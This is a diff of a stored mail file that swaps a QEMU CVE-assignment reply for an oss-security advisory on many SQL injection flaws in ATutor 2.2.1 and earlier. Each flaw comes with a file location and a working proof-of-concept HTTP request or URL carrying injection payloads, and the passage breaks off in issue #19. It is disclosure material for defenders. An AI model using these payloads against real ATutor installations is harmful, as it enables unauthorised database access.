@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1683" "Tuesday" "12" "April" "2016" "07:41:57" "-0400" "cve-assign@mitre.org" "cve-assign@mitre.org" "<20160412114157.5C4CD332042@smtpvbsrv1.mitre.org>" "42" "[oss-security] Re: CVE Request: Qemu: net: buffer overflow in MIPSnet emulator" "^Cc:" nil nil "4" "2016041211:41:57" "[oss-security] Re: CVE Request: Qemu: net: buffer overflow in MIPSnet emulator" (number mark "        cve-assign@m Apr 12   42/1683  " thread-indent "\"[oss-security] Re: CVE Request: Qemu: net: buffer overflow in MIPSnet emulator\"\n") "<alpine.LFD.2.20.1604112359170.31458@wniryva>" ("<alpine.LFD.2.20.1604112359170.31458@wniryva>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["42850" "Saturday" "2" "July" "2016" "09:42:51" "+1200" "Matthew Daley" "mattd@bugfuzz.com" "<CAD3CaneQCDQ8XSbbPArpy2TSfisiuJGJ3wxLC8mF0rOy-MPOCA@mail.gmail.com>" "1081" "[oss-security] CVE requests / Advisory: ATutor <= 2.2.1" nil nil nil "7" "2016070121:42:51" "[oss-security] CVE requests / Advisory: ATutor <= 2.2.1" (number mark "U       mattd@bugfuz Jul  2 1081/42850 " thread-indent "\"[oss-security] CVE requests / Advisory: ATutor <= 2.2.1\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0001
+X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 8180 invoked by uid 550); 12 Apr 2016 11:42:10 -0000
+Received: (qmail 26109 invoked by uid 550); 1 Jul 2016 21:43:05 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,55 +11,1121 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 8160 invoked from network); 12 Apr 2016 11:42:10 -0000
-In-Reply-To: <alpine.LFD.2.20.1604112359170.31458@wniryva>
-Message-Id: <20160412114157.5C4CD332042@smtpvbsrv1.mitre.org>
-Cc: cve-assign@mitre.org, oss-security@lists.openwall.com, oleksandr.bazhaniuk@intel.com
-Date: Tue, 12 Apr 2016 07:41:57 -0400 (EDT)
-From: cve-assign@mitre.org
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] Re: CVE Request: Qemu: net: buffer overflow in MIPSnet emulator
-To: ppandit@redhat.com
+Received: (qmail 26086 invoked from network); 1 Jul 2016 21:43:04 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=bugfuzz-com.20150623.gappssmtp.com; s=20150623;
+        h=mime-version:from:date:message-id:subject:to:cc
+         :content-transfer-encoding;
+        bh=dMKt0qnKjN/4f3w7c4RAInqu1SW2Cvq76mg9dgB9qQk=;
+        b=r4vWcoyT88s+78UW7A2tzIT3skl+U/QAXcMrUvV/KQ/N9VLUT9YuCiI3klWGE/YmSU
+         K2IXCyZvy9qSns0lrE5PMt1kZkTFsdfckyvKVq8+7xNIEcBTDEEuglWIVTzVQeVVYz7W
+         WValXh7UrWIAG6SK8TRNAUQ2IJvDomwwl8+7HwJ7vOv0Ot5zsZHFGto757tKJkOWi8FX
+         NEFdC0lvnlw0MClA13HZl0FqqsbKbUts/nWBjYMZ4jbooeQPpZt4JMtHqvSVB/5QmsSa
+         KT7EVUc8iwgeMel8Kz8RgCmILwadr2PDxQnomQMUHpH+lAxsPhdX+rlameMyseHupk7q
+         phTA==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20130820;
+        h=x-gm-message-state:mime-version:from:date:message-id:subject:to:cc
+         :content-transfer-encoding;
+        bh=dMKt0qnKjN/4f3w7c4RAInqu1SW2Cvq76mg9dgB9qQk=;
+        b=eoecZmFfUtdUiQWOiElUEbYfTZ6iQl/TMgZsLXMmstLkixiF3jWb/jH1VdUTc965iw
+         BWOD0LsmIVixZYMSALWfaK0bZScK96CO6HC3EQ0Ifmm7D6vXcTTaevlrx8OLLYji0MGq
+         9tXGdFsP+T0UlXgtnOE0GS8IdSaCVgeRC8KJZPsaWgr1BFLQjWw86ZZfVYkLuxC4koKJ
+         f78zNjC6nrUwqe1o2uUf1/c2+P2lPoNGiKudEScqkHiqQo2oDqGZxN2Drv0W4GCQeykK
+         3lo7iZdxRh9FwtPJkA7SaGuxBDkpCekeyNYGiNmN0u+fJot/g0zY9KmWqC9HWKJvJfew
+         mV+A==
+X-Gm-Message-State: ALyK8tKMTr8FlREQl3K2w1tbGb9by+aQI6CDZb31au0vbCI9nYsXp37Tx7j5lQFeE16h2xXLpUevB4Y7oAUbzw==
+X-Received: by 10.31.167.129 with SMTP id q123mr174093vke.155.1467409371548;
+ Fri, 01 Jul 2016 14:42:51 -0700 (PDT)
+MIME-Version: 1.0
+From: Matthew Daley <mattd@bugfuzz.com>
+Date: Sat, 2 Jul 2016 09:42:51 +1200
+Message-ID: <CAD3CaneQCDQ8XSbbPArpy2TSfisiuJGJ3wxLC8mF0rOy-MPOCA@mail.gmail.com>
+To: oss-security@lists.openwall.com
+Cc: cve-assign@mitre.org
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: quoted-printable
+Subject: [oss-security] CVE requests / Advisory: ATutor <= 2.2.1
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
+Affected software: ATutor
+Website: http://www.atutor.ca/
+Affected versions: up to and including 2.2.1
+Fixed version: 2.2.2
+Bug entry: http://www.atutor.ca/atutor/mantis/view.php?id=3D5681
+Changelog: http://www.atutor.ca/atutor/mantis/changelog_page.php?version_id=
+=3D55
+Reported by: Matthew Daley
 
-> Qemu emulator built with the MIPSnet controller emulator is vulnerable to a
-> buffer overflow issue. It could occur while receiving network packets in
-> mipsnet_receive(), if the guest NIC is configured to accept large(MTU)
-> packets.
-> 
-> A remote user/process could use this flaw to crash the Qemu process on a host,
-> resulting in DoS.
-> 
-> https://lists.gnu.org/archive/html/qemu-devel/2016-04/msg01131.html
-> https://bugzilla.redhat.com/show_bug.cgi?id=1326082
+I'd like to request CVE IDs for these issues. This is the first such
+request; this message serves as an advisory as well.
+Note: there may already be a CVE assigned for issue #32 as it seems multiple
+researchers have reported this issue in various forms over a period of time.
 
-Use CVE-2016-4002.
 
-This is not yet available at
-http://git.qemu.org/?p=qemu.git;a=history;f=hw/net/mipsnet.c but
-that may be an expected place for a later update.
+---------------------------------------------------------------------------=
+---
+Issue #1: Assignment dropbox file deletion SQL injection
+---------------------------------------------------------------------------=
+---
+There is a SQL injection vulnerability in deleting files from an assignment
+dropbox. The "files" POST parameter, while being escaped before interpolati=
+on
+into a SQL query that performs the deletion, is not interpolated in a conte=
+xt
+where the escaping is suitable. Namely, the parameter is interpolated in the
+context of a "IN (...)" SQL clause but escaped as if it were to be
+interpolated in the context of the content of a string literal.  Hence, it =
+is
+possible to break out and inject arbitrary SQL.
 
-- -- 
-CVE Assignment Team
-M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
-[ A PGP key is available for encrypted communications at
-  http://cve.mitre.org/cve/request_id.html ]
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
+Issue code location: mods/_standard/assignment_dropbox/index.php:96
 
-iQIcBAEBCAAGBQJXDN1xAAoJEL54rhJi8gl5ry0P/jlvWbrq0ApLur2hfkVyI7OC
-mWpOzrpRMpdonxLuRamQ1iESb7xh0hz4GL1KsBw9opthx6Cciry6gMCqWcPR7wbF
-GpxtUu5VbdkmKkXq4XQ6fiXEYBJgw0C0veGSBWLWzZRZJ7x/ty5UpepDG6r6jeX3
-hJiZMXfr03yfr8hh5jYdKBzr9HgLoqPt3Ra2KvmAh6FxlR7RT15i8hrMSHe7ZJcI
-89ZUhi0wgmgwejpjajIGvM3yRhUsFbw7MbvT4559cdoA3SL6zft93YGVnpUV9T7i
-T9j0loFjvFGb9gbO8QvOWzTQBsRpCl4U5Y/iCNGn/vRMcXQGHPluhkX9jMTThAd1
-BjKpGkcqBAnq7/fCG25O9BcEju7vvUHUkFlK7f8kGiHycPumPo9KALDcngIRVH7p
-xpM8roLcR4zLLVEnPXwVfWJGBL6tWAmP2RXhg31T6eL9X6iSOuT04GIo5I0KsT9F
-FJg7Ds0pKjqCR9XGh9Cdk1L3RZuUjPeGkPDIDwPORAtwua4V70TY+H76T1fcq3Os
-/DTgDukCB6ON2vHMaoIAFRUFwUo7Jrx60iakD3LfgnGzlQrQ0gwP0Cs8Z58uITzS
-oRwvHTeER1IQv9qhYotPJ0KstRVDfCKsn+QoS+dap1tzYFbsadzByM2u+lcb4ej0
-i3Sdbgv4KP8ADHtv5jB6
-=Q3kp
------END PGP SIGNATURE-----
+Exploitable by: Instructors and students
+
+POC HTTP request:
+| POST /atutor/mods/_standard/assignment_dropbox/index.php HTTP/1.1
+| Host: atutor-test
+| Cookie: ATutorID=3Dalgqninh9noabfut1pcu2ov2f1
+| Connection: keep-alive
+| Content-Type: application/x-www-form-urlencoded
+| Content-Length: 36
+|
+| owner_id=3D1&delete=3Dx&files[]=3DSLEEP(5)
+
+
+---------------------------------------------------------------------------=
+---
+Issue #2: BasicLTI module form handling SQL injection
+---------------------------------------------------------------------------=
+---
+There is a SQL injection vulnerability in the BasicLTI module's handling of
+forms through the at_form_validate and at_get_field_value functions. Form
+definition fields that have "radio" or "integer" type are insufficiently
+validated by at_form_validate; as long as the form value contains at least =
+one
+digit, the validation check will pass. In addition, at_get_field_value does
+not escape values of this type; hence, when the value is interpolated in the
+generated SQL query by at_form_insert or at_form_update, it is possible to
+break out and inject arbitary SQL. This can be exploited, for example, when
+modifying a BasicLTI tool's settings by an instructor.
+
+Issue code locations:
+| mods/_standard/basiclti/lib/at_form_util.php:155
+| mods/_standard/basiclti/lib/at_form_util.php:209
+
+Exploitable by: Administrators and instructors
+
+POC HTTP request:
+| POST /atutor/mods/_standard/basiclti/tool/instructor_edit.php HTTP/1.1
+| Host: atutor-test
+| Cookie: ATutorID=3Demk8ecv3uj23vthe9lf48b9p97
+| Connection: keep-alive
+| Content-Type: application/x-www-form-urlencoded
+| Content-Length: 307
+|
+| form_basiclti=3Dtrue&id=3D43&title=3Dx&toolid=3D124&description=3Dx&toolu=
+rl=3Dhttp%3a%2f%2fexample.com&resourcekey=3Dx&password=3Dx&preferheight=3D0=
+&allowpreferheight=3DSLEEP(5)&launchinpopup=3D0&debuglaunch=3D0&sendname=3D=
+0&sendemailaddr=3D0&acceptgrades=3D0&allowroster=3D0&allowsetting=3D0&allow=
+customparameters=3D0&customparameters=3D%0d
+
+
+---------------------------------------------------------------------------=
+---
+Issue #3: Blog post email SQL injection
+---------------------------------------------------------------------------=
+---
+There is a SQL injection vulnerability in sending notification emails after=
+ a
+new blog post is added. When the subscription::send_mail method is called to
+send this email, the value of the "oid" POST parameter from the post add
+request is passed as the $entity_id argument. The method interpolates this
+argument directly into a SQL query without escaping, allowing the query to =
+be
+broken out of.
+
+Issue code location: include/classes/subscribe.class.php:110
+
+Exploitable by: Administrators, instructors, students, and public users
+
+POC HTTP request:
+| POST /atutor/mods/_standard/blogs/add_post.php HTTP/1.1
+| Host: atutor-test
+| Cookie: ATutorID=3Du38hhspaedvh2lsbpdb74f0gp4
+| Connection: keep-alive
+| Content-Type: application/x-www-form-urlencoded
+| Content-Length: 78
+|
+| ot=3D1&oid=3D2'+UNION+ALL+SELECT+SLEEP(5),+NULL--+&title=3Dttt&body=3Dqww=
+w&submit=3DPost
+
+
+---------------------------------------------------------------------------=
+---
+Issue #4: Blog (un-)subscription SQL injection
+---------------------------------------------------------------------------=
+---
+There is a SQL injection vulnerability when users subscribe or unsubscribe =
+to
+blogs. The "group_id" GET parameter from the subscription/unsubscription
+request is interpolated into subscribe/unsubscribe SQL queries without
+escaping, allowing the queries to be broken out of.
+
+Issue code locations:
+| include/classes/subscribe.class.php:83
+| include/classes/subscribe.class.php:91
+
+Exploitable by: Administrators, instructors, students, and public users
+
+POC URL: http://atutor-test/atutor/mods/_standard/blogs/index.php?group_id=
+=3D2'%2bSLEEP(5)%2b'&subscribe=3Dset
+
+
+---------------------------------------------------------------------------=
+---
+Issue #5: Group course email SQL injection
+---------------------------------------------------------------------------=
+---
+There is a SQL injection vulnerability when course emails that are sent to
+specific groups. The "groups" POST parameter from the course email request,
+while being escaped before interpolation into a SQL query that performs the
+group membership lookup, is not interpolated in a context where the escaping
+is suitable. Namely, the parameter is interpolated in the context of a "IN
+(...)" SQL clause but escaped as if it were to be interpolated in the conte=
+xt
+of the content of a string literal. Hence, it is possible to break out and
+inject arbitrary SQL.
+
+Issue code location: mods/_standard/course_email/course_email.php:84
+
+Exploitable by: Instructors
+
+POC HTTP request:
+| POST /atutor/mods/_standard/course_email/course_email.php HTTP/1.1
+| Host: atutor-test
+| Cookie: ATutorID=3Dt5134h5mv6bm6b0us2frf725g4
+| Connection: keep-alive
+| Content-Type: application/x-www-form-urlencoded
+| Content-Length: 46
+|
+| subject=3Dx&body=3Dx&submit=3DSend&groups[]=3DSLEEP(5)
+
+
+---------------------------------------------------------------------------=
+---
+Issue #6: Course alumni SQL injection
+---------------------------------------------------------------------------=
+---
+There is a SQL injection vulnerability when marking users as alumni of
+courses. The user IDs provided in the "id" POST parameter from the course
+alumni update request are not sanitised before interpolation into an alumni
+update SQL query, allowing the query to be broken out of.
+
+Issue code location: mods/_core/enrolment/html/enroll_edit.inc.php:221
+
+Exploitable by: Instructors
+
+POC HTTP request:
+| POST /atutor/mods/_core/enrolment/enroll_edit.php HTTP/1.1
+| Host: atutor-test
+| Cookie: ATutorID=3Dpa7mfp2ll0usbtu3qqpkh6ghn3
+| Connection: keep-alive
+| Content-Type: application/x-www-form-urlencoded
+| Content-Length: 40
+|
+| id[]=3DSLEEP(5)&func=3Dalumni&submit_yes=3DYes
+
+
+---------------------------------------------------------------------------=
+---
+Issue #7: Course enrolment SQL injection
+---------------------------------------------------------------------------=
+---
+There is a SQL injection vulnerability when enrolling users in courses. The
+user IDs provided in the "id" POST parameter from the course enrolment
+request are not sanitised before interpolation into an enrolment update SQL
+query, allowing the query to be broken out of.
+
+Issue code location: mods/_core/enrolment/html/enroll_edit.inc.php:135
+
+Exploitable by: Instructors
+
+POC HTTP request:
+| POST /atutor/mods/_core/enrolment/enroll_edit.php HTTP/1.1
+| Host: atutor-test
+| Cookie: ATutorID=3Dlh3701emiu0jm1glfalrdnm1a4
+| Connection: keep-alive
+| Content-Type: application/x-www-form-urlencoded
+| Content-Length: 40
+|
+| id[]=3DSLEEP(5)&func=3Denroll&submit_yes=3DYes
+
+
+---------------------------------------------------------------------------=
+---
+Issue #8: Group membership removal SQL injection
+---------------------------------------------------------------------------=
+---
+There is a SQL injection when removing users from a group. The user IDs
+provided in the "id" POST parameter from the user removal request, while be=
+ing
+escaped before interpolation into a SQL query that performs the group
+membership modification, are not interpolated in a context where the escapi=
+ng
+is suitable. Namely, the parameters are interpolated in the context of a "IN
+(...)" SQL clause but escaped as if they were to be interpolated in the
+context of the content of a string literal. Hence, it is possible to break =
+out
+and inject arbitrary SQL.
+
+Issue code location: mods/_core/enrolment/html/enroll_edit.inc.php:202
+
+Exploitable by: Instructors
+
+POC HTTP request:
+| POST /atutor/mods/_core/enrolment/enroll_edit.php HTTP/1.1
+| Host: atutor-test
+| Cookie: ATutorID=3Dlh3701emiu0jm1glfalrdnm1a4
+| Connection: keep-alive
+| Content-Type: application/x-www-form-urlencoded
+| Content-Length: 46
+|
+| id[]=3DSLEEP(5)&func=3Dgroup_remove&submit_yes=3DYes
+
+
+---------------------------------------------------------------------------=
+---
+Issue #9: Course unenrolment SQL injection
+---------------------------------------------------------------------------=
+---
+There is a SQL injection vulnerability when unenrolling users from courses.
+The user IDs provided in the "id" POST parameter from the course unenrolment
+request, while being escaped before interpolation into a SQL query that
+performs the unenrolment, are not interpolated in a context where the escap=
+ing
+is suitable. Namely, the parameters are interpolated in the context of a "IN
+(...)" SQL clause but escaped as if they were to be interpolated in the
+context of the content of a string literal. Hence, it is possible to break =
+out
+and inject arbitrary SQL.
+
+Issue code location:
+| mods/_core/enrolment/html/enroll_edit.inc.php:67
+| mods/_core/enrolment/html/enroll_edit.inc.php:71
+| mods/_core/enrolment/html/enroll_edit.inc.php:97
+| mods/_core/enrolment/html/enroll_edit.inc.php:113
+
+Exploitable by: Instructors
+
+POC HTTP request:
+| POST /atutor/mods/_core/enrolment/enroll_edit.php HTTP/1.1
+| Host: atutor-test
+| Cookie: ATutorID=3Dlh3701emiu0jm1glfalrdnm1a4
+| Connection: keep-alive
+| Content-Type: application/x-www-form-urlencoded
+| Content-Length: 42
+|
+| id[]=3DSLEEP(5)&func=3Dunenroll&submit_yes=3DYes
+
+
+---------------------------------------------------------------------------=
+---
+Issue #10: MySQLi addslashes override multiple SQL injection
+---------------------------------------------------------------------------=
+---
+The addslashes function, normally provided by PHP's standard library, is
+globally overriden by ATutor depending on whether or not magic quotes are
+enabled and whether or not MySQLi is enabled. If magic quotes are disabled =
+and
+MySQLi is enabled (the default PHP setup), addslashes is overridden to perf=
+orm
+no operation, where it simply returns its input string argument unchanged.
+This causes several SQL injections in queries that attempt to use addslashes
+to escape user-controlled data before interpolation into SQL queries.
+
+Issue code location: include/lib/mysql_connect.inc.php:100
+
+At least the following locations are vulnerable due to this problem:
+
+| --------------------------------------------------------------------------
+| Issue #10A: Course enrolment list search SQL injection (with MySQLi
+|             enabled)
+| --------------------------------------------------------------------------
+| The addslashes override leads to a SQL injection vulnerability when
+| searching course enrolment lists. The "search" GET parameter from the
+| search request is passed to the addslashes function before interpolation
+| into a search query. addslashes is effectively disabled in the
+| aforementioned case where MySQLi is enabled, allowing the query to be
+| broken out of.
+|
+| Issue code location: mods/_core/enrolment/html/enrolment.inc.php:157
+|
+| Exploitable by: Instructors
+|
+| POC URL: http://atutor-test/atutor/mods/_core/enrolment/index.php?tab=3D0=
+&course_id=3D1&search=3D')))%09UNION%09ALL%09SELECT%09SLEEP(5)--%01&match=
+=3Dall&filter=3DFilter
+|
+|
+| --------------------------------------------------------------------------
+| Issue #10B: Glossary term addition SQL injection (with MySQLi enabled)
+| --------------------------------------------------------------------------
+| The addslashes override leads to a SQL injection vulnerability when adding
+| terms to the glossary. The values of the "definition" POST parameter from
+| the term addition request are passed to the addslashes function before
+| interpolation into a term insertion SQL query. addslashes is effectively
+| disabled in the aforementioned case where MySQLi is enabled, allowing the
+| query to be broken out of.
+|
+| Issue code location: mods/_core/glossary/tools/add.php:67
+|
+| Exploitable by: Instructors
+|
+| POC HTTP request:
+|     POST /atutor/mods/_core/glossary/tools/add.php HTTP/1.1
+|     Host: atutor-test
+|     Cookie: ATutorID=3D1nkfs6fc6li9aljm3mkmnjosr1
+|     Connection: keep-alive
+|     Content-Type: application/x-www-form-urlencoded
+|     Content-Length: 202
+|
+|     num_terms=3D1&word%5B0%5D=3DRANDTOKEN&definition%5B0%5D=3D%27%2C+NULL=
+%29%2C+%28NULL%2C+1%2C+%28SLEEP(5)%29%2C+%27&related_term%5B0%5D=3D0&submit=
+=3DSave
+|
+|
+| --------------------------------------------------------------------------
+| Issue #10C: Social group member search SQL injection (with MySQLi enabled)
+| --------------------------------------------------------------------------
+| The addslashes override leads to a SQL injection vulnerability when
+| searching for members in social groups. In the SocialGroup::searchMembers
+| method, the $name argument is passed to the addslashes function before
+| being interpolated into a search query. addslashes is effectively disabled
+| in the aforementioned case where MySQLi is enabled, allowing the query to
+| be broken out of.
+|
+| Issue code location: mods/_standard/social/lib/classes/SocialGroups/
+|                          SocialGroup.class.php:468
+|
+| Exploitable by: Administrators, instructors, students and public users (no
+|                 public course required)
+|
+| POC URL: http://atutor-test/atutor/mods/_standard/social/groups/list.php?=
+id=3D123&q=3D')%09UNION%09ALL%09SELECT%09SLEEP(5),NULL,NULL,NULL,NULL,NULL,=
+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,=
+NULL,NULL,NULL,NULL--%01
+|
+|
+| --------------------------------------------------------------------------
+| Issue #10D: Social friend search SQL injection (with MySQLi enabled)
+| --------------------------------------------------------------------------
+| The addslashes override leads to a SQL injection vulnerability when
+| searching a user's social friends. In the searchFriends function, the
+| $name argument is passed to the addslashes function before being
+| interpolated into a search query. addslashes is effectively disabled in
+| the aforementioned case where MySQLi is enabled, allowing the query to be
+| broken out of.
+|
+| Issue code locations:
+|     mods/_standard/social/lib/friends.inc.php:281
+|     mods/_standard/social/lib/friends.inc.php:284
+|
+| Exploitable by: Administrators, instructors, students and public users (no
+|                 public course required)
+|
+| POC URLs:
+|     http://atutor-test/atutor/mods/_standard/social/index_public.php?q=3D=
+')%09UNION%09ALL%09SELECT%09SLEEP(5),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NUL=
+L,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%01
+|     http://atutor-test/atutor/mods/_standard/social/connections.php?q=3D%=
+27)%09OR%09first_name=3DSLEEP(5)--%01
+(not exploitable by public users)
+|
+|
+| --------------------------------------------------------------------------
+| Issue #10E: Social group search SQL injection (with MySQLi enabled)
+| --------------------------------------------------------------------------
+| The addslashes override leads to a SQL injection vulnerability when
+| searching social groups. In the SocialGroups::search method, the $query
+| argument is passed to the addslashes function before being interpolated
+| into a search query. addslashes is effectively disabled in the
+| aforementioned case where MySQLi is enabled, allowing the query to be
+| broken out of.
+|
+| Issue code locations:
+|     mods/_standard/social/lib/classes/SocialGroups/
+|         SocialGroups.class.php:214
+|     mods/_standard/social/lib/classes/SocialGroups/
+|         SocialGroups.class.php:215
+|
+| Exploitable by: Administrators, instructors and students
+|
+| POC URL: http://atutor-test/atutor/mods/_standard/social/groups/search.ph=
+p?q=3D%27%09AND%09SLEEP(5)--%01
+
+
+---------------------------------------------------------------------------=
+---
+Issue #11: File comment SQL injection
+---------------------------------------------------------------------------=
+---
+There is a SQL injection vulnerability when users add comments to uploaded
+files. The "comment" POST parameter in the comment addition request is
+interpolated into a SQL query template before it used in a call to queryDB.
+This means that printf-style format sequences will be interpreted as if they
+came from the actual SQL query template, allowing the escaping performed on
+the parameter to be bypassed by interpolating parts of the escaped comment
+back into the query structure. For example, the string "39%4$c" can be
+interpolated into the SQL query template through the "comment" POST paramet=
+er.
+When the SQL query template is processed by the call to vsprintf in the
+create_sql function, this will be interpreted as the string "39" followed b=
+y a
+format sequence that formats the value of the 4th parameter to the call to
+queryDB as the integer value of a character. In this case, the 4th parameter
+is the value of the "comment" POST parameter again, and ASCII value 39 is a
+single quotation mark ('). This means that the SQL string literal will be
+broken out at this point, and anything after this string will be interpreted
+as additional SQL query syntax.
+
+Issue code location: mods/_standard/file_storage/comments.php:72
+
+Exploitable by: Instructors, students and public users
+
+POC HTTP request:
+| POST /atutor/mods/_standard/file_storage/comments.php?ot=3D1&oid=3D1&id=
+=3D1 HTTP/1.1
+| Host: atutor-test
+| Cookie: ATutorID=3Dcdvfse97jevef972u07ksp88a5
+| Connection: keep-alive
+| Content-Type: application/x-www-form-urlencoded
+| Content-Length: 135
+|
+| id=3D1&folder=3D0&comment=3D39%254$c),(NULL,1,1,NOW(),SLEEP(5))--%01&subm=
+it=3DPost
+
+
+---------------------------------------------------------------------------=
+---
+Issue #12: Gradebook test title SQL injection
+---------------------------------------------------------------------------=
+---
+There is a SQL injection vulnerability when setting gradebook test titles. =
+The
+value of the "title" POST parameter from the title change request is not
+escaped before interpolation into a test update SQL query, allowing the que=
+ry
+to be broken out of.
+
+Issue code location: mods/_standard/gradebook/gradebook_edit_tests.php:55
+
+Exploitable by: Instructors
+
+POC HTTP request:
+| POST /atutor/mods/_standard/gradebook/gradebook_edit_tests.php?gradebook_=
+test_id=3D1
+HTTP/1.1
+| Host: atutor-test
+| Cookie: ATutorID=3Drmmem1odcl14a5hhkqre0dbbe0
+| Connection: keep-alive
+| Content-Type: application/x-www-form-urlencoded
+| Content-Length: 178
+|
+| title=3D%27%2Ctitle%3D%28SLEEP(5)%29%2Ctype%3D%27External&selected_grade_=
+scale_id=3D4&has_due_date=3Dfalse&save=3DSave
+
+
+---------------------------------------------------------------------------=
+---
+Issue #13: Unassigned user group membership update SQL injection
+---------------------------------------------------------------------------=
+---
+There is a SQL injection vulnerability in the "assign unassigned" group
+membership update functionality. The keys of the "groups" POST parameter ar=
+ray
+from the assignment request are not escaped before interpolation into a gro=
+up
+membership insertion SQL query, allowing the query to be broken out of.
+
+Issue code locations:
+| mods/_core/groups/members.php:116
+| mods/_core/groups/members.php:124
+
+Exploitable by: Instructors
+
+POC HTTP request:
+| POST /atutor/mods/_core/groups/members.php HTTP/1.1
+| Host: atutor-test
+| Cookie: ATutorID=3Dkb0tpe389ki621hr8cs8iko3o4
+| Connection: keep-alive
+| Content-Type: application/x-www-form-urlencoded
+| Content-Length: 52
+|
+| id=3D1&assign=3DAssign+Unassigned&groups%5BSLEEP(5)%5D=3D0
+
+
+---------------------------------------------------------------------------=
+---
+Issue #14: Inbox/sent items message deletion SQL injection
+---------------------------------------------------------------------------=
+---
+There is a SQL injection vulnerability when deleting messages from a user's
+inbox or sent item folders. The value of the "ids" POST parameter from the
+deletion request, while being escaped before interpolation into a SQL query
+that performs the deletion, is not interpolated in a context where the
+escaping is suitable. Namely, the parameter is interpolated in the context =
+of
+a "IN (...)" SQL clause but escaped as if it were to be interpolated in the
+context of the content of a string literal. Hence, it is possible to break =
+out
+and inject arbitrary SQL.
+
+Issue code locations:
+| inbox/index.php:48
+| inbox/sent_messages.php:42
+
+Exploitable by: Administrators, instructors and students
+
+POC HTTP request:
+| POST /atutor/inbox/index.php HTTP/1.1
+| Host: atutor-test
+| Cookie: ATutorID=3D3ett149cjokimnrr4caie15fd5
+| Connection: keep-alive
+| Content-Type: application/x-www-form-urlencoded
+| Content-Length: 27
+|
+| ids=3DSLEEP(5)&submit_yes=3DYes
+
+
+---------------------------------------------------------------------------=
+---
+Issue #15: Sent messages moving SQL injection
+---------------------------------------------------------------------------=
+---
+There is a SQL injection vulnerability when moving messages from a user's s=
+ent
+items folder. The values of the "id" POST parameter array from the move
+request, while being escaped before interpolation into a SQL query that
+performs the moving, is not interpolated in a context where the escaping is
+suitable. Namely, the parameter is interpolated in the context of a "IN (..=
+.)"
+SQL clause but escaped as if it were to be interpolated in the context of t=
+he
+content of a string literal. Hence, it is possible to break out and inject
+arbitrary SQL.
+
+Issue code location: inbox/sent_messages.php:59
+
+Exploitable by: Administrators, instructors and students
+
+POC HTTP request:
+| POST /atutor/inbox/sent_messages.php HTTP/1.1
+| Host: atutor-test
+| Cookie: ATutorID=3Dk1d32hmjmbp0k80irup2e2gji6
+| Connection: keep-alive
+| Content-Type: application/x-www-form-urlencoded
+| Content-Length: 22
+|
+| id[]=3DSLEEP(5)&move=3DYes
+
+
+---------------------------------------------------------------------------=
+---
+Issue #16: Links search SQL injection
+---------------------------------------------------------------------------=
+---
+There is a SQL injection vulnerability when searching course links. The
+"search" GET parameter from the search request is not escaped before
+interpolation into a search query, allowing the query to be broken out of.
+
+Issue code location: mods/_standard/links/index.php:109
+
+Exploitable by: Administrators, instructors, students and public users
+
+POC URL: http://atutor-test/atutor/mods/_standard/links/?search=3D%22))%20u=
+nion%20select%20all%201,2,3,SLEEP(5),5,6,7,8,9,10,11,12,13,14--%01
+
+
+---------------------------------------------------------------------------=
+---
+Issue #17: Links sorting SQL injection
+---------------------------------------------------------------------------=
+---
+There is a SQL injection vulnerability when sorting course links on the lin=
+ks
+tool page. The "col" and "order" GET parameters from the listing request are
+not escaped before interpolation into a link query as sort parameters,
+allowing the query to be broken out of.
+
+Issue code location: mods/_standard/links/tools/index.php:69
+
+Exploitable by: Instructors
+
+POC URL: http://atutor-test/atutor/mods/_standard/links/tools/index.php?col=
+=3D%20&order=3DSLEEP(5)
+
+
+---------------------------------------------------------------------------=
+---
+Issue #18: Photo album search SQL injection
+---------------------------------------------------------------------------=
+---
+There is a SQL injection vulnerability when searching photo albums. The
+"search" POST parameter from the search request is not escaped before
+interpolation into a search query, allowing the query to be broken out of.
+
+Issue code location: mods/_standard/photos/include/classes/
+|                      PhotoAlbum.class.php:633
+
+Exploitable by: Administrators, instructors, students and public users (no
+|             public course required)
+
+POC HTTP request:
+| POST /atutor/mods/_standard/photos/search.php HTTP/1.1
+| Host: atutor-test
+| Connection: keep-alive
+| Content-Type: application/x-www-form-urlencoded
+| Content-Length: 134
+|
+| pa_search=3D')%09UNION%09ALL%09SELECT%09NULL,NULL,SLEEP(5),NULL,NULL,NULL=
+,NULL,NULL,NULL%09FROM%09AT_admins--%01
+
+
+---------------------------------------------------------------------------=
+---
+Issue #19: New poll SQL injection
+---------------------------------------------------------------------------=
+---
+There is a SQL injection vulnerability when creating new polls. The POST
+parameters for the new poll's choices (starting with "c" and followed by a
+number) from the poll creation requqest are initially escaped (by the
+addslashes function). If they then exceed 100 characters, they are truncated
+to 100 characters. Finally, the resulting choices are interpolated into a p=
+oll
+creation SQL query. The vulnerability lies in the fact that the truncation
+occurs after the escaping. It is possible to have one choice truncated so t=
+hat
+it ends in a single backslash character, escaping the single quotation mark
